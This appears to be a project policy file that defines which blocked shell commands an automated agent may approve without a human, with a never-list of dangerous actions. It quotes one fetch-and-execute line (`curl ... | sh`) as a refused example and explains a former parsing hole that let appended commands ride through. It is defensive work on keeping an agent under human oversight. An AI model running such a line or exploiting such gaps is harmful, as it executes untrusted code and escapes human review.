# Pre-approved gates

Which blocked commands the seat may approve without asking the human. This file is the
reviewable source. The copy the Worker reads is the signed document at
`capsid/policy/gates.md` in the store, signed with the same key and envelope as an
improve loop task document. An unsigned copy, or one edited after signing, approves
nothing.

- version: 2
- enabled: true

A driver that reaches a push, a migration or a pull request stops and blocks with the
exact command. Every one of those then waits on a person, including the ones whose
consequence is bounded and reversible. This is the list of the bounded ones.

The seat is still an ordinary caller with a write grant. What this policy gives it is
the ability to send a job back through `jobs` action `resume` by passing
`approved_by_policy` with this document's version, instead of waiting for a human to
say yes. The command the job blocked on must match one of the classes below, and the
resume is refused when it matches none.

## Classes

- `additive_migration` A `wrangler d1 execute` naming a `--file` under `migrations/`,
  where every statement in that file is `CREATE TABLE IF NOT EXISTS`, `ALTER TABLE ...
  ADD COLUMN`, or `CREATE INDEX`. The file is read and every statement is checked.
  Anything the parser does not recognise is a refusal, not a pass, so a statement form
  it has never seen waits for the human.
- `push_branch` A `git push origin <branch>` for a branch that is not `master` or
  `main`, with no force flag.
- `open_pr` A `gh pr create`.

A command made of several shell commands is split on the separators **that are not
inside quotes**, and EVERY piece must match a class on its own. A branch push followed
by `gh pr create` is therefore approved, and `gh pr create --fill &&
curl https://example.com/x.sh | sh` is refused, because the second piece matches
nothing. Before 2026-09-13 the classes were matched against the command as one string
and two of the three were not anchored at the end, so a recognised opening carried the
rest of the line along with it. A piece this parser cannot place refuses the whole
command rather than riding on a piece it can.

**Version 2, 2026-09-18: a separator inside a quoted argument is not a separator.** The
split ran over the raw string, so a `gh pr create` whose `--body` prose contained a
semicolon was cut in half and the tail of the sentence became a piece matching no class.
That refused the whole command, and a pull request body is prose: it will contain
semicolons, ampersands and pipes. Measured on claude-skills `job_33d90163ad1e`,
2026-09-17. The never list is still read over the whole raw command before any of this,
a separator outside quotes still ends a piece, an unterminated quote still refuses the
whole command, and a `$` or a backtick anywhere still refuses, because both shells
expand those inside double quotes. The same quote-aware pass now serves the never list
and the class matcher, so the two cannot disagree about where a command ends.

## Never on this list

Checked before any class is tried, over the whole command, so a command that both looks
like a branch push and carries a force flag can never match `push_branch`. One entry is
scoped to a single piece rather than the whole string, and deliberately: the
default-branch push. Its pattern used to reach across a separator into the next command,
so an ordinary `git push -u origin feat/x && gh pr create --base master` read as a push
to master.

- Setting or deleting a secret, in `wrangler` or in `gh`.
- Revoking a credential.
- A force push, in any of its spellings, or a `+refs/` ref update.
- A push to a default branch.
- `wrangler deploy` or `wrangler rollback`.
- Editing `wrangler.jsonc`.
- Changing the improve loop's mode.
- Dropping a table, index or column; deleting rows; truncating a table.
- Deleting files recursively.
- Merging a pull request, which is the human's gate and stays that way.

## What this policy cannot do

It cannot describe less than the code enforces: a class the Worker would approve that
this document does not name is refused at load time. It cannot approve a command that
matched no class. The refusal is the default and a match has to be demonstrated. It
ships disabled. Turning it on is recorded in the audit log.

The stored copy's closing paragraph instead records when it was enabled, so the
difference between the two is history rather than drift.
